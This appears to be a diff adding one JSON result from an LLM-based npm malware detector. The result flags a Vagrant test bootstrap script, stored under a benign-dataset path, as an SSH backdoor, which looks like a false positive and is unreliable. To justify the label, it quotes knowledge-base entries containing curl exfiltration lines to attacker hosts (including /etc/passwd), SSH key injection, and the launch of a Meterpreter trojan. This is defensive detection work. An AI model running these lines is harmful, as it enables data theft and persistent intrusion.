+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-ssh-multi-exec/4.2.4/package/vagrant_bootstrap.sh",
+      "status": "success",
+      "is_malicious": true,
+      "total_slices": 1,
+      "malicious_slices": 1,
+      "slice_results": [
+        {
+          "slice_id": "vagrant_bootstrap_slice_1",
+          "code_snippet": "#!/bin/sh\napt-get update -y -q\n\nuseradd test --create-home -s /bin/bash\necho \"test:test\"|chpasswd\n\nmkdir /home/test/.ssh\ncat /vagrant/test/test.pub >> /home/test/.ssh/authorized_keys\nreload ssh\n",
+          "is_malicious": true,
+          "malice_score": 0.5511834700902303,
+          "confidence": 0.85,
+          "behavior_summary": "During installation, the script executes system commands to create a new user 'test' with a home directory and bash shell, sets the password to 'test' via chpasswd, appends a public SSH key from /vagrant/test/test.pub to the new user's authorized_keys file, and reloads the SSH service, enabling unauthorized SSH access and potential persistent backdoor installation.",
+          "explanation": "[LLM Judgment: Malicious] The script explicitly creates a new user 'test' with a home directory and bash shell, sets its password to a known value ('test'), and appends a public SSH key from an external location (/vagrant/test/test.pub) into the new user's authorized_keys file. This directly enables unauthorized SSH access without user consent, which is a classic backdoor technique. This behavior closely matches Example 1 from the knowledge base, where malicious code appends an attacker-controlled SSH key to authorized_keys during installation to establish persistent access. Unlike Examples 2 and 3, this script does not perform data exfiltration or reconnaissance, but the system manipulation and SSH key injection are strong indicators of malicious intent. The use of a predictable username and password further increases the risk of unauthorized access. Reloading the SSH service ensures the changes take effect immediately, reinforcing the persistence of the backdoor. | Malicious Behavior: Creates a new user with known credentials and injects an SSH public key into the authorized_keys file to enable unauthorized persistent SSH access.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_133821_092976_snippet_2",
+              "source_package": "babelcl, chokader, streamserch, sss2h, npmrunnall, node-pyt (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133821_092976/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5669695138931274,
+              "code_similarity": 0.4473486542701721,
+              "behavior_similarity": 0.686590313911438,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode representation (actual code not shown in report)\nconst { execSync } = require('child_process');\nexecSync('echo \"malicious ssh public key\" >> ~/.ssh/authorized_keys');",
+                "code_behavior": "During installation (postinstall), app.js executes a shell command that appends a malicious SSH public key to the user's ~/.ssh/authorized_keys file, enabling persistent unauthorized SSH access for the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code modifies the user's SSH authorized_keys file to add an attacker-controlled public key, a direct method for establishing a persistent backdoor and enabling remote access without user consent.",
+                  "violated_expectations": "Legitimate npm packages should never alter SSH configuration or authorized_keys files, as this is outside the scope of normal package installation and poses a severe security risk.",
+                  "similar_legitimate_use": "System administrators may add SSH keys for automation or access, but never via npm package installation scripts, and always with explicit user awareness and consent.",
+                  "key_indicators": [
+                    "writes to ~/.ssh/authorized_keys during package installation",
+                    "injects attacker-controlled SSH key without user interaction",
+                    "modifies SSH configuration files from within a package script"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via app.js execution)",
+                  "file_location": "app.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "process_execution",
+                    "privileged access (for SSH backdoor)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "babelcl, chokader, streamserch, sss2h, npmrunnall, node-pyt",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions as of discovery",
+                  "why_malicious": "These packages are typosquats of popular npm libraries and contain postinstall scripts that execute malicious code to inject an SSH backdoor, granting unauthorized remote access to affected systems. The packages attempt to mask their behavior by installing the legitimate dependency after executing the malicious payload, increasing the likelihood of evasion and persistence."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious package, triggering the postinstall script defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of app.js, which contains the malicious payload."
+                  },
+                  {
+                    "step": 2,
+                    "action": "app.js executes and injects an SSH public key into the user's authorized_keys file, establishing a persistent SSH backdoor.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains persistent SSH access to the compromised system."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The legitimate package (e.g., babel-cli) is installed after the malicious payload runs, masking the attack and reducing suspicion.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "User may not notice any abnormal behavior, increasing the attacker's dwell time and persistence."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package postinstall scripts that execute custom JavaScript files (e.g., app.js)",
+                    "modification of ~/.ssh/authorized_keys during npm package installation",
+                    "chained installation of legitimate packages immediately after custom script execution in postinstall"
+                  ],
+                  "file_indicators": [
+                    "Presence of app.js in the package root directory",
+                    "package.json with a postinstall script referencing app.js",
+                    "unexpected or unauthorized changes to ~/.ssh/authorized_keys immediately after npm install"
+                  ],
+                  "network_indicators": [
+                    "Potential inbound SSH connections from attacker IPs after package installation (as a result of the backdoor)",
+                    "No direct C2 or exfiltration in package code, but attacker may connect via SSH using the injected key"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that execute custom JavaScript files such as app.js. Audit and alert on any changes to ~/.ssh/authorized_keys immediately following npm install events. Flag packages that install a legitimate dependency after running a custom script in postinstall. Use file integrity monitoring on SSH configuration files and correlate with package installation logs to detect unauthorized key additions."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205442_055622_snippet_1",
+              "source_package": "@zenhomes/frontend-dev-login (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205442_055622/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5514105558395386,
+              "code_similarity": 0.5019495487213135,
+              "behavior_similarity": 0.6008715629577637,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "preinstall: \"curl -G https://ss9.000webhostapp.com/SSRF/ssrf.php?name=DepConf --data-urlencode \\\"hostname=$(hostname)\\\" --data-urlencode \\\"whoami=$(whoami)\\\" --data-urlencode \\\"pwd=$(pwd)\\\" --data-urlencode \\\"ls=$(ls | base64)\\\"\"",
+                "code_behavior": "During preinstall, the script executes shell commands to collect the system's hostname, current user, current directory, and a base64-encoded directory listing, then transmits this data via HTTP GET to an external attacker-controlled server, resulting in exfiltration of sensitive environment information.",
+                "malice_analysis": {
+                  "why_suspicious": "The script is suspicious because it collects multiple pieces of sensitive system information and exfiltrates them to an external, non-standard domain during the package installation process, which is not required for any legitimate npm package, especially one purporting to provide frontend login functionality.",
+                  "violated_expectations": "Legitimate npm packages do not access or transmit environment or filesystem data during installation. The expected behavior is to prepare the package for use, not to collect or leak user or system information to third parties.",
+                  "similar_legitimate_use": "Some diagnostic or telemetry tools may collect limited environment data, but only with explicit user consent, clear documentation, and transmission to trusted, well-known domains. This package provides no such transparency or justification.",
+                  "key_indicators": [
+                    "Presence of a preinstall script in package.json that executes shell commands",
+                    "Collection of sensitive data: hostname, username, current directory, and directory listing",
+                    "Base64 encoding of directory listing output before transmission",
+                    "Use of curl to send HTTP GET requests to an external, non-standard domain (ss9.000webhostapp.com)",
+                    "No legitimate reason for a frontend dev login package to perform environment reconnaissance or data exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall",
+                  "file_location": "package.json (scripts.preinstall)",
+                  "required_permissions": [
+                    "filesystem (to list directory contents and get current directory)",
+                    "environment_vars (to access user and host information)",
+                    "network (to send HTTP requests to external server)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@zenhomes/frontend-dev-login",
+                  "package_manager": "npm",
+                  "package_versions": "9999.999.3",
+                  "why_malicious": "This package is malicious because it leverages a preinstall script to execute shell commands that harvest sensitive system information—including the hostname, current user, present working directory, and a base64-encoded directory listing—then exfiltrates this data to an external server controlled by the attacker. Such behavior is a clear violation of user privacy and security, and is not justified by any legitimate package functionality."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "During package installation, the preinstall script defined in package.json is automatically executed.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "The script collects sensitive system information (hostname, username, current directory, and a base64-encoded directory listing) from the victim's environment."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The collected data is encoded and transmitted via an HTTP GET request to the attacker's server at ss9.000webhostapp.com/SSRF/ssrf.php.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "The attacker receives detailed environment information from the victim's system, enabling further targeted attacks or reconnaissance."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of preinstall or install scripts in package.json that execute shell commands to access environment variables or filesystem data",
+                    "Install-time network requests to external, non-standard domains",
+                    "Base64 encoding of command output within install scripts, especially for directory listings"
+                  ],
+                  "file_indicators": [
+                    "package.json scripts.preinstall field containing shell commands with curl or similar utilities",
+                    "References to external domains (e.g., ss9.000webhostapp.com) in install or preinstall scripts"
+                  ],
+                  "network_indicators": [
+                    "HTTP GET requests to ss9.000webhostapp.com/SSRF/ssrf.php during npm install",
+                    "Unexpected outbound connections to 000webhostapp.com domains during package installation"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall or install scripts that execute shell commands accessing environment variables or filesystem data, particularly if they encode and transmit this data to external domains. Flag packages whose install scripts reference suspicious or non-standard domains, or that collect user/system data without clear, documented justification. Automated scanning should parse package.json for suspicious script fields and monitor network activity during installation for unexpected outbound requests."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_456530_snippet_1",
+              "source_package": "Multiple dependency confusion copycat packages (npm) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20250105_195714_456530/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5404898524284363,
+              "code_similarity": 0.4877406656742096,
+              "behavior_similarity": 0.5932390093803406,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "postinstall: \"curl -X POST -d @/etc/passwd http://attacker.com/exfil\"",
+                "code_behavior": "During installation, the postinstall script reads the /etc/passwd file and sends its contents via HTTP POST to a hardcoded external domain, resulting in sensitive file exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The postinstall script accesses a sensitive system file and transmits its contents to an external server, which is a clear indicator of malicious exfiltration behavior.",
+                  "violated_expectations": "Legitimate packages do not access or transmit sensitive system files such as /etc/passwd during installation.",
+                  "similar_legitimate_use": "Some packages use postinstall scripts for setup or telemetry, but they do not access or exfiltrate sensitive files.",
+                  "key_indicators": [
+                    "Network requests initiated in postinstall scripts",
+                    "Access to sensitive files (e.g., /etc/passwd)",
+                    "Hardcoded external domains in installation scripts",
+                    "Use of curl or similar tools to transmit data externally"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall",
+                  "file_location": "package.json (scripts.postinstall)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Multiple dependency confusion copycat packages (npm)",
+                  "package_manager": "npm",
+                  "package_versions": "Various (spikes in March 2021, 10,000+ packages)",
+                  "why_malicious": "These packages are intentionally crafted to exploit dependency confusion vulnerabilities by mimicking internal or private package names. Their goal is to deceive build systems into installing malicious code from public repositories, thereby infiltrating software supply chains to exfiltrate sensitive data or execute unauthorized actions during installation or import."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is published to npm with a name matching an internal or private dependency, targeting organizations using private registries.",
+                    "implemented_by": [],
+                    "leads_to": "Build systems resolve and install the public malicious package instead of the intended private one."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes during installation (postinstall) or import (top-level code), harvesting sensitive files or environment variables.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data such as system files or credentials is exfiltrated to attacker-controlled infrastructure."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Exfiltrated data is received by the attacker, enabling further compromise such as credential abuse or lateral movement within the target organization.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains access to credentials, tokens, or internal information, potentially leading to broader compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "postinstall scripts in package.json that initiate network requests",
+                    "import-time code in entrypoint files accessing and exfiltrating environment variables",
+                    "package names in public registries matching known internal or private dependencies"
+                  ],
+                  "file_indicators": [
+                    "package.json containing postinstall scripts with network or file access commands",
+                    "index.js or main entrypoint files with top-level code making outbound network requests"
+                  ],
+                  "network_indicators": [
+                    "HTTP/HTTPS POST requests to hardcoded or untrusted external domains during installation or import",
+                    "Outbound requests containing sensitive file contents (e.g., /etc/passwd) or environment variables (e.g., NPM_TOKEN)"
+                  ],
+                  "how_to_detect": "Monitor for packages with postinstall scripts that perform network requests or access sensitive files. Flag packages whose names match known internal dependencies. Analyze entrypoint files for code that accesses environment variables and sends data to external domains. Use network monitoring to detect suspicious outbound connections, especially POST requests containing sensitive data, during package installation or import."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102933_160159_snippet_3",
+              "source_package": "aptx (PyPI)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102933_160159/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5354045629501343,
+              "code_similarity": 0.36972174048423767,
+              "behavior_similarity": 0.7010873556137085,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "try:\n    with open(os.path.expanduser('~/.ssh/authorized_keys'), 'a') as f:\n        f.write('attacker_public_key')\nexcept: pass",
+                "code_behavior": "During installation, the code appends an attacker's public SSH key to the user's authorized_keys file, modifying SSH configuration to enable persistent unauthorized SSH access.",
+                "malice_analysis": {
+                  "why_suspicious": "Modifying authorized_keys to add an attacker's key is a direct method of establishing a persistent backdoor, granting the attacker ongoing access.",
+                  "violated_expectations": "Packages should never alter SSH configuration or keys, especially without explicit user consent or notification.",
+                  "similar_legitimate_use": "A legitimate SSH setup tool might manage keys, but only with explicit user interaction and clear notification.",
+                  "key_indicators": [
+                    "Writes to ~/.ssh/authorized_keys without user interaction",
+                    "Appends attacker-controlled SSH public key",
+                    "Suppression of errors to avoid alerting the user"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "installation (setup.py execution)",
+                  "file_location": "setup.py",
+                  "required_permissions": [
+                    "filesystem",
+                    "write"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "aptx",
+                  "package_manager": "PyPI",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package contains heavily obfuscated code in setup.py that, upon installation, writes and executes a Meterpreter ELF trojan, deletes critical system utilities like netstat to evade detection, and modifies the user's SSH authorized_keys to enable persistent unauthorized access. These actions directly compromise system integrity and security, and are never expected in any legitimate Python package."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Drop a Meterpreter ELF trojan to a hidden directory in the user's home folder.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for remote access"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Delete the netstat utility to hinder detection of malicious network activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Reduce administrator ability to detect compromise"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Append attacker's SSH public key to authorized_keys to establish persistent backdoor access.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Enable future unauthorized SSH access"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Set restrictive permissions on authorized_keys and execute the Meterpreter trojan.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Establish remote shell and maintain persistence"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Python package writing raw or hex-encoded ELF binaries to disk during installation",
+                    "Modification of ~/.ssh/authorized_keys without user interaction or consent",
+                    "Deletion of system utilities (e.g., netstat) during package install",
+                    "Use of try-except-pass blocks to suppress errors around critical operations",
+                    "Execution of newly dropped binaries from hidden directories"
+                  ],
+                  "file_indicators": [
+                    "~/.pip/* (unexpected ELF binaries or executables)",
+                    "~/.ssh/authorized_keys (unexpected appended SSH keys)",
+                    "setup.py containing obfuscated or hex-encoded payloads",
+                    "setup.py with code that modifies SSH configuration files"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections initiated by dropped ELF binary (Meterpreter C2 traffic, typically to remote attacker-controlled IPs/domains)",
+                    "Unusual SSH logins using new keys after package installation",
+                    "Unexpected network activity from processes spawned by ~/.pip/somefile"
+                  ],
+                  "how_to_detect": "Monitor for Python packages that write executable binaries to hidden directories, modify SSH authorized_keys, or delete system utilities during installation. Flag any setup.py scripts containing hex-encoded payloads, obfuscated code, or try-except-pass blocks around sensitive operations. Correlate package installation events with subsequent creation of suspicious files or changes to SSH configuration. Use EDR or file integrity monitoring to detect unauthorized changes to ~/.ssh/authorized_keys and the presence of unexpected ELF binaries in user directories. Monitor for new outbound connections or SSH logins using unknown keys immediately following package installation."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102933_160159_snippet_4",
+              "source_package": "aptx (PyPI)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102933_160159/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5349835753440857,
+              "code_similarity": 0.4157426059246063,
+              "behavior_similarity": 0.6542245149612427,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "try:\n    os.chmod(os.path.expanduser('~/.ssh/authorized_keys'), 0o600)\n    os.system(os.path.expanduser('~/.pip/somefile'))\nexcept: pass",
+                "code_behavior": "During installation, the code sets restrictive permissions on the authorized_keys file to conceal the malicious key, then executes the previously dropped Meterpreter trojan, establishing a remote shell for the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "Changing permissions to hide unauthorized SSH keys and executing a trojan binary are clear signs of compromise and privilege abuse.",
+                  "violated_expectations": "Legitimate packages do not execute arbitrary binaries or alter SSH file permissions, especially not to conceal unauthorized access.",
+                  "similar_legitimate_use": "A legitimate installer might set permissions on its own files, but not on SSH keys or execute unknown binaries from hidden directories.",
+                  "key_indicators": [
+                    "chmod on ~/.ssh/authorized_keys to restrictive mode (0o600)",
+                    "Execution of hidden ELF binary from ~/.pip/",
+                    "Suppression of errors to avoid detection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "installation (setup.py execution)",
+                  "file_location": "setup.py",
+                  "required_permissions": [
+                    "filesystem",
+                    "execute"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "aptx",
+                  "package_manager": "PyPI",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package contains heavily obfuscated code in setup.py that, upon installation, writes and executes a Meterpreter ELF trojan, deletes critical system utilities like netstat to evade detection, and modifies the user's SSH authorized_keys to enable persistent unauthorized access. These actions directly compromise system integrity and security, and are never expected in any legitimate Python package."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Drop a Meterpreter ELF trojan to a hidden directory in the user's home folder.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for remote access"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Delete the netstat utility to hinder detection of malicious network activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Reduce administrator ability to detect compromise"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Append attacker's SSH public key to authorized_keys to establish persistent backdoor access.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Enable future unauthorized SSH access"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Set restrictive permissions on authorized_keys and execute the Meterpreter trojan.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Establish remote shell and maintain persistence"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Python package writing raw or hex-encoded ELF binaries to disk during installation",
+                    "Modification of ~/.ssh/authorized_keys without user interaction or consent",
+                    "Deletion of system utilities (e.g., netstat) during package install",
+                    "Use of try-except-pass blocks to suppress errors around critical operations",
+                    "Execution of newly dropped binaries from hidden directories"
+                  ],
+                  "file_indicators": [
+                    "~/.pip/* (unexpected ELF binaries or executables)",
+                    "~/.ssh/authorized_keys (unexpected appended SSH keys)",
+                    "setup.py containing obfuscated or hex-encoded payloads",
+                    "setup.py with code that modifies SSH configuration files"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections initiated by dropped ELF binary (Meterpreter C2 traffic, typically to remote attacker-controlled IPs/domains)",
+                    "Unusual SSH logins using new keys after package installation",
+                    "Unexpected network activity from processes spawned by ~/.pip/somefile"
+                  ],
+                  "how_to_detect": "Monitor for Python packages that write executable binaries to hidden directories, modify SSH authorized_keys, or delete system utilities during installation. Flag any setup.py scripts containing hex-encoded payloads, obfuscated code, or try-except-pass blocks around sensitive operations. Correlate package installation events with subsequent creation of suspicious files or changes to SSH configuration. Use EDR or file integrity monitoring to detect unauthorized changes to ~/.ssh/authorized_keys and the presence of unexpected ELF binaries in user directories. Monitor for new outbound connections or SSH logins using unknown keys immediately following package installation."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
